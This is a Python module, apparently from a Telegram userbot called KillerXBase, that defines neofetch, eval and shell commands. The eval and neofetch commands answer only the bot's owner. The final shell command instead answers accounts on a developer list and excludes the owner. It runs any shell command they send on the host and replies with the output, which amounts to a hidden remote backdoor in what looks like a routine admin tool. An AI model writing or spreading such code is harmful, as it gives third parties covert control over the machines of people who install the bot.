import asyncio
import io
import os
import sys
import re
import traceback
import subprocess
from io import StringIO
from KillerXBase.database import cli as database
from pyrogram.types import *
from pyrogram import *
from pyrogram import Client as ren
from pyrogram import Client
from pyrogram import Client as app
from KillerXBase.helper.cmd import *
from KillerXBase.helper.basic import *
from KillerXBase.helper.PyroHelpers import *
from KillerXBase.helper.misc import *
from KillerXBase.modules.help import *
from KillerXBase.helper.dev import *
from KillerXBase import *

@ren.on_message(filters.command(["neofetch"], cmd) & filters.user(DEVS) & filters.me)
async def neofetch(c, m):
    neofetch = (await shell_exec("neofetch --stdout"))[0]
    await m.reply(f"<code>{neofetch}</code>")

@ren.on_message(filters.command(["eval", "ev", "e"], cmd) & filters.user(DEVS) & filters.me & ~filters.forwarded & ~filters.via_bot)
async def evaluation_cmd_t(client, message):
    status_message = await message.reply("__Processing eval pyrogram...__")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await status_message.edit("__No evaluate message!__")
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    redirected_error = sys.stderr = io.StringIO()
    stdout, stderr, exc = None, None, None

    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()

    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr

    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"

    final_output = f"**EVAL**:\n`{cmd}`\n\n**OUTPUT**:\n`{evaluation.strip()}`\n"

    if len(final_output) > 4096:
        with open("eval.txt", "w+", encoding="utf8") as out_file:
            out_file.write(final_output)
        await status_message.reply_document(
            document="eval.txt",
            caption=cmd[: 4096 // 4 - 1],
            disable_notification=True,
        )
        os.remove("eval.txt")
        await status_message.delete()
    else:
        await status_message.edit(final_output, parse_mode=enums.ParseMode.MARKDOWN)


async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {l_}" for l_ in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


async def shell_exec(code, treat=True):
    process = await asyncio.create_subprocess_shell(
        code, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT
    )

    stdout = (await process.communicate())[0]
    if treat:
        stdout = stdout.decode().strip()
    return stdout, process



@ren.on_message(filters.command(["shell", "sh"], cmd) & filters.user(DEVS) & ~filters.me)
async def shell(client, message):
    cmd = message.text.split(" ", 1)
    if len(cmd) == 1:
        return await message.reply("No command to execute was given.")
    shell = (await shell_exec(cmd[1]))[0]
    if len(shell) > 3000:
        with open("shell_output.txt", "w") as file:
            file.write(shell)
        with open("shell_output.txt", "rb") as doc:
            await message.reply_document(document=doc, file_name=doc.name)
            try:
                os.remove("shell_output.txt")
            except:
                pass
    elif len(shell) != 0:
        await message.reply(shell, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply("No Reply")
